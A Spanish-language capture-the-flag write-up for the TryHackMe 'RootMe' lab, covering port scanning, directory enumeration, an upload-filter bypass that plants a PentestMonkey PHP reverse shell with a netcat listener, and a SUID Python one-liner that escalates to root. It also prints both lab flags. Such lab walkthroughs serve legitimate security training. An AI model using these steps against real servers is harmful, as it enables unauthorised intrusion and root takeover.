# RootMe - TryHackMe Writeup

## 1. Reconocimiento (Reconnaissance)

### Escaneo de Puertos Inicial

```bash
nmap -sS -Pn --min-rate 5000 --top-ports 10000 --open -vvv 10.112.150.20 -oG allPorts
```

    Puertos abiertos: 22/tcp (SSH) y 80/tcp (HTTP).

![Reconocimiento](img/1.png)

### Análisis de Servicios y Versiones

#### Escaneo detallado para determinar versiones y scripts por defecto:

```bash
nmap -sCV -p22,80 10.112.150.20 -oN targeted
```

    SSH (22/tcp): OpenSSH 8.2p1 Ubuntu.

    HTTP (80/tcp): Apache httpd 2.4.41 (Ubuntu).

    Info Adicional: El título de la web es "HackIT Home" y utiliza PHP (PHPSESSID detectado).

![Servicios](img/2.png)

### Análisis en Web

Buscamos cualquier cosa que nos pueda llamar la atención en el inspector y no encontramos nada interesante.

![web](img/3.png)

## 2. Enumeración Web
### Gobuster para la búsqueda de directorios:

```bash
gobuster dir -u http://10.112.150.20 -w /usr/share/wordlists/dirb/common.txt
```

    Resultados clave:

        /panel/ (Status: 301) - Formulario de subida.

        /uploads/ (Status: 301) - Directorio de archivos.

![Gobuster](img/4.png)
![Panel](img/5.png)

## 3. Explotación
### Obtención de Reverse Shell

#### Filtro de archivos: El servidor bloquea archivos .php con el mensaje "PHP não é permitido!".

![upload shell.php](img/7.png)
![bloqueo php](img/8.png)

#### Bypass: Se renombra la shell de PentestMonkey a una extensión permitida:

```bash
mv shell.php shell.phtml
```
![shell.phtml](img/9.png)

#### Ejecución: Se sube con éxito.

![upload shell.phtml](img/10.png)

#### Abrimos una terminal y se pone un listener (nc -lvnp 4444).

![listener](img/11.png)

#### Accedemos a la ruta /uploads y encontramos nuestro archivo subido.

![/uploads](img/11.1.png)

#### Pinchamos el archivo y nos abre una shell con el usuario www-data.

![www-data](img/12.png)

### User Flag:

    Localización: /var/www/user.txt.

    Flag: THM{you_got_a_sh3ll}.

![user.txt](img/13.png)

## 4. Escalada de Privilegios
### Enumeración de SUID

#### Búsqueda de binarios con permisos de root:

```bash
find / -perm -4000 2>/dev/null
```

Se identifica *Python 2.7 en /usr/bin/python2.7* como vector de ataque.
Explotación Root

![SUID](img/14.png)

#### Ejecución de comando para elevar privilegios:

```bash
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```
![escalada-root](img/15.png)

### Root Flag:

    Localización: /root/root.txt.

    Flag: THM{pr1v113g3_3sc4l4t10n}.

![root.txt](img/16.png)